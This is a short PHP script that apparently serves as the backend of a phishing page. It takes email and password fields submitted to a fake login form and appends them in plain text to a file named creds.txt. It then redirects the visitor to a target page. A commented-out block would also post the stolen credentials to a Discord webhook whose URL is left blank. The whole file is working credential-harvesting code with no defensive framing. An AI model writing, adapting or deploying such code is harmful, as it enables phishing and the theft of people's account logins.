<?php
header('Location: target.html');
echo "FAKE PAGE!";
$var = $_POST['email'];
$var2 = $_POST['pass'];
file_put_contents("creds.txt", "Email/Username: " . $var . " Password: " . $var2 . "\n", FILE_APPEND);

/* DISCORD WEBHOOK
$url = '';
$data = array('content' => 'Email: ' . $var . ' password: ' . $var2);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
*/

//var_dump($result);
exit();
?>
